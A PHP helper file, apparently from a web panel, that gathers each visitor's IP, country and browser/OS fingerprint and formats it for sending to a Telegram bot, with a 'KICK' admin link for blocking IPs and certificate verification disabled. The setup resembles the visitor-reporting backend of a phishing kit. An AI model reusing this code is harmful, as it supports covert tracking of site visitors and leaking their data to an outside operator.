<?php
require_once($_SERVER["DOCUMENT_ROOT"] . "/data/lib/BrowserDetection.php");

$protocol = isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http";
$hostname = $_SERVER["HTTP_HOST"];
$fullDomain = $protocol . "://" . $hostname;
$domain = $fullDomain;
if ($protocol === "http") {
    $domain = "http://www.localhost";
}

$btnBl = [
    [
        "text" => "KICK",
        "url" => $domain . "/admin/action?blip=" . $ip
    ],
    [
        "text" => "ADMIN",
        "url" => $domain . "/admin"
    ]
];

$detect = new foroco\BrowserDetection();
$result = json_decode($detect->getAll($agent, "JSON"), true);

$co = $ipInfo["countryCode"];
$emoji = country2flag($co);
// <a href="https://ip-api.com/#" . $ip . "">" . $ip . "</a>
$info = "

<b>🧩 Extra</b>
├ " . country2flag($co) . " Country : <code>" . $co . "</code> 
├ 🌐 Adresse IP : <code>" . $ip . "</code>
└ 🖥️ OS : <b>"  .  $result["browser_name"] . " | " .  $result["browser_version"] . " | " . $result["device_type"] . " | " . $result["os_name"] . " " .  $result["os_version"] .  "</b>";

function createId($oct = 16)
{
    return bin2hex(random_bytes($oct));
}

function telegram_api($token, $method, $params = [], $post = false)
{
    $url = ("https://api.telegram.org/bot" . $token . "/") . $method;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);


    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
    }

    if ($method == "sendPhoto") {
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
    }

    if (!empty($params)) {
        if ($post) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        } else {
            $url .= "?" . http_build_query($params);
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        throw new Exception("cURL Error: " . $error);
    }

    return json_decode($response, true)["result"] ?? json_decode($response, true);
}

function country2flag($countryCode)
{
    return mb_convert_encoding("&#" .
        implode(
            ";&#",
            array_map(function ($char) {
                return 127397 + ord($char);
            }, str_split(strtoupper($countryCode)))
        ) . ";", "UTF-8", "HTML-ENTITIES");
}
